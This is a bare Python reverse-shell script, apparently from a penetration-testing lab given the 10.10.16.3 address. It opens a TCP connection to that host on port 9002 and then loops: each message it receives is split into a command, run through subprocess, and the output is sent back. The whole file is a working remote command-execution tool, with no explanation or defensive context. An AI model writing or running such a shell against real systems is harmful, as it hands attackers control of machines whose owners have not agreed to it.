import socket
import subprocess
import os
import pty
import sys

lhost="10.10.16.3"
lport=9002

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect(("10.10.16.3", 9002))
while True:
    msg = sock.recv(4096).decode("utf-8")
    rcv = msg.split()
    rsp = subprocess.run(rcv, capture_output=True)
    sock.sendall(rsp.stdout)
sock.close()

